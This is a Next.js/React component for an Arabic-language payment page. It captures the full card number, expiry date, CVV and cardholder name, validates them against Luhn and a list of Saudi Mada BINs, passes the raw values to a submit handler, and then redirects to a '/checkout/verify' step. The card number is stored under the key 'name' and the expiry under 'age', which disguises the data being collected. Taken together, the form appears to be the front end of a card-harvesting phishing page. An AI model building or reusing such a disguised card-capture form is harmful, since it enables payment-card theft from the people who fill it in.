"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import { FaWifi } from "react-icons/fa";
import cardValidator from "card-validator";

interface PaymentFormProps {
  onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string }) => Promise<void>;
}

export default function PaymentForm({ onSubmit }: PaymentFormProps) {
  const router = useRouter();
  const [fields, setFields] = useState({ name: "", age: "", cvv: "", cardHolder: "" });
  const [errors, setErrors] = useState(false);
  const [cardError, setCardError] = useState("");
  const [expiryError, setExpiryError] = useState("");
  const [cvvError, setCvvError] = useState("");
  const [loading, setLoading] = useState(false);
  const [flipped, setFlipped] = useState(false);

  const MADA_BINS = new Set(["588845","440647","440795","446404","457865","968208","457997","474491","543357","434107","431361","604906","521076","588848","968210","968211","968212","968213","968214","968215","968216","968217","968218","968219","968220","531095","531196","532013","535825","535989","536023","537767","539931","543085","549760","558563","585265","588850","588982","589005","589206","604906","636120","968201","968202","968203","968204","968205","968206","968207"]);

  const getCardType = (num: string): "Visa" | "Mastercard" | "Mada" | null => {
    if (!num) return null;
    if (num.length >= 6 && MADA_BINS.has(num.slice(0, 6))) return "Mada";
    const { card } = cardValidator.number(num);
    if (!card) return null;
    if (card.type === "visa") return "Visa";
    if (card.type === "mastercard") return "Mastercard";
    return null;
  };

  const luhnCheck = (num: string) => {
    let sum = 0;
    let shouldDouble = false;
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = parseInt(num[i]);
      if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  };

  const handleNext = async () => {
    const rawCard = fields.name.replace(/\s/g, "");
    if (!fields.name || !fields.age || !fields.cvv || !fields.cardHolder) {
      setErrors(true);
      return;
    }
    if (rawCard.length !== 16) { setCardError("رقم البطاقة يجب أن يكون 16 رقمًا"); return; }
    if (!luhnCheck(rawCard)) { setCardError("⚠️ رقم البطاقة غير صحيح"); return; }
    if (!getCardType(rawCard)) { setCardError("⚠️ نوع البطاقة غير مدعوم، يرجى استخدام Visa أو Mastercard أو Mada"); return; }
    setCardError("");
    if (fields.cvv.length !== 3) { setCvvError("⚠️ رمز CVV يجب أن يكون 3 أرقام"); return; }
    setCvvError("");
    const parts = fields.age.split("/");
    const expMonth = Number(parts[0]);
    const expYear = Number(parts[1]);
    const now = new Date();
    if (!expMonth || !expYear || parts[0]?.length !== 2 || parts[1]?.length !== 2) {
      setExpiryError("⚠️ يرجى إدخال تاريخ انتهاء صحيح بصيغة MM/YY");
      return;
    }
    if (expMonth < 1 || expMonth > 12) {
      setExpiryError("⚠️ الشهر يجب أن يكون بين 01 و 12");
      return;
    }
    const cardDate = new Date(2000 + expYear, expMonth - 1, 1);
    const currentMonth = new Date(now.getFullYear(), now.getMonth(), 1);
    if (cardDate < currentMonth) {
      setExpiryError("⚠️ تاريخ انتهاء البطاقة منتهي، يرجى استخدام بطاقة سارية");
      return;
    }
    if (2000 + expYear > now.getFullYear() + 10) {
      setExpiryError("⚠️ تاريخ انتهاء البطاقة غير صحيح");
      return;
    }
    setExpiryError("");
    setLoading(true);
    try {
      await onSubmit(fields);
      router.push("/checkout/verify");
    } finally {
      setLoading(false);
    }
  };

  const inputClass = (field: keyof typeof fields) =>
    `w-full border rounded-lg px-3 py-2.5 text-base sm:text-sm outline-none bg-white text-gray-800 placeholder-gray-400 focus:border-[#7CC043] ${errors && !fields[field] ? "border-red-400" : "border-gray-300"}`;

  const cardType = getCardType(fields.name.replace(/\s/g, ""));
  const displayNumber = fields.name || "0000 0000 0000 0000";
  const displayHolder = fields.cardHolder || "FULL NAME";
  const displayExpiry = fields.age || "MM/YY";

  const cardBg =
    cardType === "Mada" ? "from-green-500 to-green-800" :
    cardType === "Visa" ? "from-blue-600 to-blue-900" :
    cardType === "Mastercard" ? "from-orange-500 to-red-800" :
    "from-slate-600 to-slate-900";

  return (
    <>
      {/* Card Preview with Flip */}
      <div className="w-full px-2 sm:px-0 sm:max-w-md mx-auto" style={{ perspective: "1000px" }}>
        <div
          className="relative w-full transition-transform duration-700"
          style={{
            transformStyle: "preserve-3d",
            transform: flipped ? "rotateY(180deg)" : "rotateY(0deg)",
            height: "clamp(170px, 48vw, 210px)",
          }}
        >
          {/* Front */}
          <div
            className={`absolute inset-0 rounded-2xl sm:rounded-3xl bg-gradient-to-br ${cardBg} text-white p-4 sm:p-6 shadow-2xl select-none overflow-hidden`}
            style={{ backfaceVisibility: "hidden" }}
            dir="ltr"
          >
            <div className="absolute inset-0 bg-gradient-to-tr from-white/10 to-transparent rounded-2xl sm:rounded-3xl pointer-events-none" />
            <div className="flex justify-between items-start">
              <FaWifi className="rotate-90 opacity-60" size={20} />
              {cardType === "Mada" && <Image src="/mada975b.png" alt="Mada" width={52} height={28} className="object-contain brightness-200" />}
              {(cardType === "Visa" || cardType === "Mastercard") && <Image src="/cc975b.png" alt={cardType} width={60} height={28} className="object-contain brightness-200" />}
              {!cardType && <span className="text-xs opacity-40 font-semibold tracking-widest">BANK CARD</span>}
            </div>
            <div className="mt-2 w-8 h-6 sm:w-10 sm:h-7 rounded-md bg-yellow-300/80 flex items-center justify-center">
              <div className="w-5 h-3.5 sm:w-6 sm:h-4 rounded-sm border border-yellow-500/60 grid grid-cols-3 gap-px p-0.5">
                {[...Array(6)].map((_, i) => <div key={i} className="bg-yellow-500/50 rounded-sm" />)}
              </div>
            </div>
            <div className="mt-2 sm:mt-3 tracking-[0.18em] sm:tracking-[0.22em] text-base sm:text-xl font-mono font-semibold">{displayNumber}</div>
            <div className="flex justify-between items-end mt-3 sm:mt-4">
              <div>
                <p className="text-[9px] sm:text-[10px] opacity-50 uppercase tracking-widest">Card Holder</p>
                <p className="text-xs sm:text-sm font-bold tracking-wide truncate max-w-[140px] sm:max-w-[200px]">{displayHolder}</p>
              </div>
              <div className="text-right">
                <p className="text-[9px] sm:text-[10px] opacity-50 uppercase tracking-widest">Expires</p>
                <p className="text-xs sm:text-sm font-bold">{displayExpiry}</p>
              </div>
            </div>
          </div>

          {/* Back */}
          <div
            className={`absolute inset-0 rounded-2xl sm:rounded-3xl bg-gradient-to-br ${cardBg} text-white shadow-2xl select-none overflow-hidden`}
            style={{ backfaceVisibility: "hidden", transform: "rotateY(180deg)" }}
            dir="ltr"
          >
            <div className="absolute inset-0 bg-gradient-to-tr from-white/10 to-transparent rounded-2xl sm:rounded-3xl pointer-events-none" />
            <div className="w-full h-8 sm:h-10 bg-black/70 mt-6 sm:mt-7" />
            <div className="px-4 sm:px-6 mt-4 sm:mt-5">
              <p className="text-[9px] sm:text-[10px] opacity-50 uppercase tracking-widest mb-1">CVV</p>
              <div className="bg-white/90 rounded-lg h-9 sm:h-10 flex items-center px-3 sm:px-4">
                <span className="text-gray-800 font-mono font-bold tracking-[0.3em] text-sm sm:text-base">
                  {fields.cvv ? "•".repeat(fields.cvv.length) : "•••"}
                </span>
              </div>
            </div>
            <div className="absolute bottom-3 sm:bottom-4 right-4 sm:right-6">
              {cardType === "Mada" && <Image src="/mada975b.png" alt="Mada" width={48} height={28} className="object-contain brightness-200 opacity-70" />}
              {(cardType === "Visa" || cardType === "Mastercard") && <Image src="/cc975b.png" alt={cardType} width={56} height={28} className="object-contain brightness-200 opacity-70" />}
            </div>
          </div>
        </div>
      </div>

      <div className="bg-white border border-gray-200 rounded-2xl overflow-hidden p-4 sm:p-6">
        <div className="flex justify-start items-center mb-4">
          <Image src="/فيزا ماستر مدى.webp" alt="Visa Mastercard Mada" width={120} height={40} className="object-contain" />
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          <div className="sm:col-span-2">
            <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1">رقم البطاقه <span className="text-red-400">*</span></label>
            <div className="relative">
              <input
                autoComplete="cc-number" type="text" placeholder="0000 0000 0000 0000" maxLength={19} dir="ltr" style={{textAlign: "right"}}
                value={fields.name}
                onChange={e => {
                  let v = e.target.value.replace(/\D/g, "").slice(0, 16);
                  v = v.match(/.{1,4}/g)?.join(" ") ?? v;
                  setFields(f => ({ ...f, name: v }));
                  setCardError("");
                }}
                className={`${inputClass("name")} pr-16`}
              />
              {fields.name.replace(/\s/g, "").length >= 1 && (
                <span className="absolute left-3 top-1/2 -translate-y-1/2">
                  {cardType === "Visa" && (
                    <svg viewBox="0 0 48 16" width="48" height="16" xmlns="http://www.w3.org/2000/svg">
                      <rect width="48" height="16" rx="3" fill="#1A1F71"/>
                      <text x="24" y="12" textAnchor="middle" fill="white" fontSize="11" fontWeight="bold" fontFamily="Arial">VISA</text>
                    </svg>
                  )}
                  {cardType === "Mastercard" && (
                    <svg viewBox="0 0 48 30" width="40" height="25" xmlns="http://www.w3.org/2000/svg">
                      <circle cx="18" cy="15" r="12" fill="#EB001B"/>
                      <circle cx="30" cy="15" r="12" fill="#F79E1B"/>
                      <path d="M24 6.27a12 12 0 0 1 0 17.46A12 12 0 0 1 24 6.27z" fill="#FF5F00"/>
                    </svg>
                  )}
                  {cardType === "Mada" && (
                    <svg viewBox="0 0 48 20" width="48" height="20" xmlns="http://www.w3.org/2000/svg">
                      <rect width="48" height="20" rx="3" fill="#4CAF50"/>
                      <text x="24" y="14" textAnchor="middle" fill="white" fontSize="10" fontWeight="bold" fontFamily="Arial">mada</text>
                    </svg>
                  )}
                  {!cardType && <span className="text-xs font-semibold text-gray-400">غير معروف</span>}
                </span>
              )}
            </div>
            {cardError && (
              <p className="text-red-500 text-sm font-medium mt-1.5 flex items-center gap-1">
                <span>⚠️</span> {cardError}
              </p>
            )}
          </div>
          <div>
            <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1">تاريخ الانتهاء <span className="text-red-400">*</span></label>
            <input
              autoComplete="cc-exp" type="text" placeholder="MM/YY" maxLength={5}
              value={fields.age}
              onChange={e => { let v = e.target.value.replace(/\D/g, ""); if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2, 4); setFields(f => ({ ...f, age: v })); setExpiryError(""); }}
              className={`${inputClass("age")} ${expiryError ? "border-red-400" : ""}`}
            />
            {expiryError && (
              <p className="text-red-500 text-sm font-medium mt-1.5">{expiryError}</p>
            )}
          </div>
          <div>
            <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1">رمز ال CVV <span className="text-red-400">*</span></label>
            <input
              autoComplete="cc-csc" type="text" placeholder="000" maxLength={3}
              value={fields.cvv}
              onFocus={() => setFlipped(true)}
              onBlur={() => setFlipped(false)}
              onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 3); setFields(f => ({ ...f, cvv: v })); setCvvError(""); }}
              className={`${inputClass("cvv")} ${cvvError ? "border-red-400" : ""}`}
            />
            {cvvError && <p className="text-red-500 text-sm font-medium mt-1.5">{cvvError}</p>}
          </div>
          <div className="sm:col-span-2">
            <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1">اسم حامل البطاقة <span className="text-red-400">*</span></label>
            <input
              autoComplete="cc-name" type="text" placeholder="اسم حامل البطاقة"
              value={fields.cardHolder}
              onChange={e => { const v = e.target.value.replace(/[^a-zA-Z ]/g, ""); setFields(f => ({ ...f, cardHolder: v.toUpperCase() })); }}
              className={inputClass("cardHolder")}
            />
          </div>
        </div>
      </div>

      <div className="flex gap-3">
        <button
          onClick={() => router.push("/cart")}
          className="flex-1 border border-gray-300 text-gray-600 font-medium py-3.5 rounded-2xl text-sm hover:bg-gray-100 transition"
        >
          السابق
        </button>
        <button
          onClick={handleNext}
          disabled={loading}
          className="flex-1 bg-[#7CC043] hover:bg-[#89BA45] active:scale-[0.98] text-white font-medium py-3.5 rounded-2xl transition-all text-sm disabled:opacity-60 disabled:cursor-not-allowed"
        >
          {loading ? "جاري المعالجة..." : "التالي"}
        </button>
      </div>
    </>
  );
}
